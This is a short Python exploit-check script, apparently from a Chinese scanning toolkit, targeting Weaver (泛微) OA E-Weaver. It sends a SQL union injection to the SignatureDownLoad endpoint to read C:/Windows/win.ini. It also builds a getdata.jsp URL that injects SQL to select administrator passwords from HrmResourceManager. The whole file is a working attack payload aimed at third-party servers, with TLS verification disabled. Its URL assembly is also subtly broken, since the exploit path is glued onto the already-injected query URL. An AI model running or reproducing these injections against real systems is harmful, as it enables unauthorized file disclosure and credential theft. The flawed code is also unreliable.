import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging


def 泛微OA_signnature_任意文件访问(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    target_url = urldata + "js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    exp_url = target_url + 'weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27'


    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
        if response.status_code == 200 and 'files' in response.text:
            print(Vcolors.RED + "[!] 存在泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞\r" + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞" + Vcolors.ENDC)
    except Exception as e:
        logging.error("泛微OA_signnature_任意文件访问脚本出现异常")
  
        


